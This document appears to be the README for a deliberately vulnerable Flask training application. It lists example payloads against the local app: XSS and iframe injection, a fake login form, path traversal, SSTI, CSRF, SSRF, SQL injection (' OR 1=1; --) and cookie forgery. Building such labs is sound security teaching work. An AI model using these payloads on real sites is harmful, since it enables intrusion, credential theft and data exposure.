# Description:
FVA Flask Vulnerable Application was developed for the purpose of learning. 

# TODO:
* сделать заглушки в случае невалидных логина или пароля или необходиомсти аутентификации
* csrf добавить подключение к БД psql
* перенести в env основные конфигурационные настройки

# Vulnerabilities 
### XSS + Iframe injection

```html
http://localhost:8888/xss?param=<script>alert(1)</script>

<img src=https://stackoverflow.com/ onerror=alert(1)>

<script>alert(document.domain)</script>

<a href="javascript:alert(document.domain);">click here</a>

<iframe src="data:text/html,<script>alert('XSS')</script>"></iframe>

<iframe src="http://httpforever.com/></iframe>

<form name="login" action="http://ip: port/">
 	<label for="login">login: </label>
 	<input type="text" name="login" required>
 	<br>
 	<label for="password">password: </label>
 	<input type="password" name="password" required>
 	<br>
 	<input type="submit" value="Login!">
 </form>

<script>
window.addEventListener('load', function() {
    var sw = "/sw.js";
    navigator.serviceWorker.register(sw, {scope: '/'})
       .then(function(registration) {
            console.log('Service Worker registered successfully');
        })
       .catch(function(err) {
            console.error('Service Worker registration failed:', err);
        });
});
</script>
```

# PATH TRAVERSAL
открыть код и найти каким образом идет обращение к картинке
'view-source:http://localhost:8888/path_travers'
'<img src="/path_travers_img/?img=/static/scripting.png" alt="what_is_that" width="100" height="100"></p>'

exploit
```URL
http://localhost:8888/path-travers-img/?img=/static/scripting.png
http://localhost:8888/path_travers_img/?img=/README.md
http://localhost:8888/path_travers_img/?img=/../venv.txt
```

# SSTI 
exploit
```URL
http://localhost:8888/ssti?param={{(9*9)}}
http://localhost:8888/ssti?param={{%20config.items()%20}}
```

# XSS via Service worker
/upload

PoC upload sw.js
```js
setInterval(function() {
  console.log("U been h@cked");
}, 5000);
```

# CSRF
/csrf через другую вкладку
python3 -m http.server 9000
Фишинговая ссылка hacker_csrf.html
http://127.0.0.1:9000/Projects/FVA/hacker_csrf.html

/csrf через GET
http://localhost:8888/change_password?id=1&new_password=h@cked

# SSRF
GET request: 
http://localhost:8888/ssrf?url=http://localhost:8888/xss

POST request: 
curl -X POST -d "url=http://localhost:8888/xss" http://localhost:8888/ssrf


# SQl injection
brew services start postgresql
psgl postgres
python init_db.py from modules.init_db import create_database
=# \dt
=# SELECT * FROM users;

injection 
login: ' OR 1=1; --
password: any

# command_injection
/go to command_injection
change cookie to admin > base64

# CORS test
python -m http.server 8000
devtools > console:
fetch('http://localhost:8888/api/users')
  .then(response => response.text())
  .then(data => console.log(data))
  .catch(error => console.error('Error:', error));

  
